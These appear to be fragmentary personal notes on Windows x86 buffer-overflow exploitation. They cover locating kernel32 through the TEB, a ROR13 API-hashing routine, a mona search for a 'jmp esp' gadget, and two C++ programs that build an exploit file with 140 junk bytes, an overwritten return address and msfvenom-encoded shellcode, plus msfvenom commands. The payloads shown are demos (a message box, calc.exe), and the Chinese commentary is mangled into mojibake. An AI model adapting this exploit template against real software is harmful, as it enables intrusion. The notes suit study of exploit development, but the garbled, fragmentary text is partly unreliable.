  PWSTR  Buffer;

} UNICODE_STRING, *PUNICODE_STRING;

"ntdll.dll"

   +0x000 Length           : 0x12

   +0x002 MaximumLength    : 0x14

   +0x004 Buffer           : 0x7c942158  "ntdll.dll"

From TEB to BaseDllName

 

# Helper function for rotate-right on 32-bit architectures

def ror(number, bits):

    return ((number >> bits) | (number << (32 - bits))) & 0xffffffff

 

# Define hashing algorithm

def get_hash(data):

    # Initialize hash to 0

    result = 0

    # Loop each character

    for b in data:

        # Make character uppercase if needed

        if b < ord('a'):

            b -= 0x20

        # Rotate DllHash right by 0x0D bits (13

        result = ror(result, 0x0D)

        # Add character to DllHash

        result = (result + b) & 0xffffffff

    return result



# Define a NULL-terminated base DLL name

name = 'KERNEL32.DLL\0'

# Encode it as Unicode(utf 16)

encoded = name.encode('UTF-16-LE')

# Compute the hash

value = hex(get_hash(encoded))

# And print it ('0x92af16da')

print(value)

From LDR_DATA_TABLE_ENTRY to IMAGE_EXPORT_DIRECTORY.

 

Process inject(CWE-1288

Cwe823

 if all hashes fail to match(eg.out-of-bounds read

occur resulting in an invalid pointer being de-referenced.  

PushMode = 1 ËØ•Ê†áÂøóÊîπÂèò‰∫ÜÂ≠óÁ¨¶‰∏≤ÁöÑÂéãÂÖ•ÊñπÂºèÔºå‰ΩøË∞ÉËØïÂ∑•ÂÖ∑Êó†Ê≥ïËØÜÂà´Âá∫Â≠óÁ¨¶‰∏≤

RetCall = 1 ËØ•Ê†áÂøóÊîπÂèòAPIË∞ÉÁî®ÊñπÂºè

HashApi = 1 ËØ•Ê†áÂøóÂºÄÂêØÂêéÂ∞ÜÁî±Ëá™Â∑±ÂÆûÁé∞APIÂú∞ÂùÄÁöÑÊêúÁ¥¢Ôºå‰∏îAPIÂêçÁß∞‰ΩøÁî®HASHÂÄº



Cld

clear-direction-flag

 



!mona jmp -r

jmp -r esp

0x7c86467b : jmp esp |  {PAGE_EXECUTE_READ} [kernel32.dll]

#include <iostream>

#include <fstream>

#include <string>

using namespace std;

   

#define FILENAME "Vulnerable001_Exploit.txt"

   

int main() {

    string junk(140,'A');

    string eip("\x7b\x46\x86\x7c"); // 7c86467b, litten-endian

    string shellcode("\xcc\xcc\xcc\xcc"); // shellcode

   

    ofstream fout(FILENAME, ios::binary);

    fout << junk << eip << shellcode;

   

    cout << "ÊîªÊìäÊ™îÊ°à: " << FILENAME << " Ëº∏Âá∫ÂÆåÊàê\n";

} 

!mona compare -f c:\1\1.binÔºàfor debug

C:\Documents and Settings\iiii\My Documents

Msf

msfvenom -p windows/messagebox ICON=WARNING TEXT=Hello there TITLE=General Kenobi: -b '\x0c\x0d\x20\x1a\x00\x0a\x0b\' 

-f c -a x86



#include <iostream>

#include <fstream>

#include <string>

using namespace std;

   

#define FILENAME "Vulnerable001_Exploit.txt"

   

char code[] =

"\xbd\x7b\xe6\x3a\xb6\xda\xc2\xd9\x74\x24\xf4\x58\x33\xc9\xb1"

"\x44\x83\xc0\x04\x31\x68\x0e\x03\x13\xe8\xd8\x43\x3a\x1f\x87"

"\x75\xc8\xc4\x4c\xb4\xe2\xb7\xda\x86\xcb\xdc\xaf\x98\xfb\x97"

"\xc6\x56\x70\xd1\x3a\xec\xc0\x16\xc8\x8c\xec\xad\xf8\x48\xa3"

"\xa9\x71\x5a\x62\xcb\xa8\x63\x75\xab\xc1\xf0\x51\x08\x5d\x4d"

"\xa5\xdb\x35\x66\xad\xda\x5f\xfd\x07\xc5\x14\x58\xb7\xf4\xc1"

"\xbe\x83\xbf\x9e\x75\x60\x3e\x4f\x44\x89\x70\x4f\x5b\xd9\xf7"

"\x8f\xd0\x26\x39\xc0\x14\x29\x7e\x34\xd2\x12\xfc\xef\x33\x11"

"\x1d\x64\x19\xfd\xdc\x90\xf8\x76\xd2\x2d\x8e\xd2\xf7\xb0\x7b"

"\x69\x03\x38\x7a\x85\x85\x7a\x59\x49\xf7\x41\x13\x79\xde\x91"

"\xdd\x9c\xa9\xd8\xb6\xd0\xe4\xd2\xaa\xbe\x10\x75\xcd\xc1\x1e"

"\x03\x77\x39\x5a\x6a\xa0\xa3\xef\x14\x4c\x07\x42\xf3\xe3\xb8"

"\x9d\xfc\x75\x03\x6a\x6b\xea\xe7\x4a\x2a\x9a\xc4\xb8\x82\x3e"

"\x42\xc8\xa9\xdb\xe0\x02\x95\xac\x58\x47\x23\x24\x86\xd1\xcc"

"\x63\x42\x57\xf0\xdc\xf1\xcf\x57\x91\xb9\x97\x84\x0e\x93\x7f"

"\xeb\xb1\xec\x7f\x7c\x27\x4a\xa0\x5d\xdf\x0f\xce\xf2\x7d\xa7"

"\x7c\x6c\xee\x7c\xe9\x29\x8b\xec\x8c\x84\x88\x78\x12\xc3\x23"

"\xf1\x48\x63\x4e\x64\xd7\x54\xc6\x09\x93\xfc\x73\xbd\x13\x98"

"\x17\x51\x95\xab\x60\xe5\xf1\x21\xf8\x14\xc8\xe7\x90\xe6\x78"

"\x59\x37\xf9\xaf\x68\x77\x55\xaf\xde\x7f";

int main() {

    string junk(140,'A');

string eip("\x7b\x46\x86\x7c"); // 7c86467b, litten-endian

//string debug("\xcc\xcc\xcc\xcc"); // for debugging shellcode

string nops(8, '\x90'); // ËÆì shikata_ga_nai ÁöÑËß£Á¢ºÂô®ÈñãÂøÉÂú∞Ê≠£Â∏∏ÈÅã‰Ωú

    string shellcode(code); // shellcode

   

    ofstream fout(FILENAME, ios::binary);

   // fout << junk << eip << debug << nops << shellcode;

    fout << junk << eip << nops << shellcode;

    cout << "ÊîªÊìäÊ™îÊ°à: " << FILENAME << " Ëº∏Âá∫ÂÆåÊàê\n";

} 

NOP Êåá‰ª§ÊòØËÆì CPU Á©∫ËΩâ‰∏ÄÂÄãÈÅãÁÆóÂñÆ‰ΩçÊôÇÈñìÔºå‰∏¶‰∏çÊúÉ‰Ωú‰ªª‰Ωï‰∫ãÔºåÊâÄ‰ª•ÂæàÈÅ©ÂêàÁî®‰æÜ„ÄåÂ°´Á©∫„ÄçÔºåËÆì shellcode Èõ¢Â†ÜÁñäÈ†≠‰∏çË¶ÅÈÄôÈ∫ºËøëÔºåÊàëÈÄöÂ∏∏‰ΩøÁî® shikata_ga_nai ÁöÑÊôÇÂÄôÊúÉÂ°´ 8 ÂÄã‰ΩçÂÖÉÂ∑¶Âè≥ÁöÑÁ©∫Èñì(sometimes16‰∏™



msfvenom -a x86 --platform windows -p windows/exec CMD='calc.exe' -b '\x00\x09\x0a\x0d\x1a\x20' -f c

